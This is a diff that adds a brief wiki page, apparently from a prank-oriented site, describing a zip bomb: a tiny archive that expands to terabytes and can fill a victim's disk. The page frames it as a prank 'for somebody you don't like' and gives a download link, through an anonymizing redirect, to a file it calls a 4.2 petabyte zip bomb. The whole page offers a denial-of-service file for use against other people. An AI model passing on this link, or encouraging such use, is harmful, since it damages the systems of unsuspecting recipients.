@@ -1,0 +1,7 @@
+==About==
+A '''Zip Bomb''' is basically a heavily compressed folder, that when decompresses contains tons of raw shit (Like a few terabytes) which will most likely use up their entire hard drive. It's a pain-in-the-ass prank for somebody you don't like. Don't try to extract it yourself, or face teh consequences.
+
+==Download==
+[http://anonym.to/http://www.unforgettable.dk/42.zip 4.2 petabyte zip bomb.] (Contains 4301 terabytes, or 4404019 gigabytes of compressed shit).
+
+[[Category:Tools]]
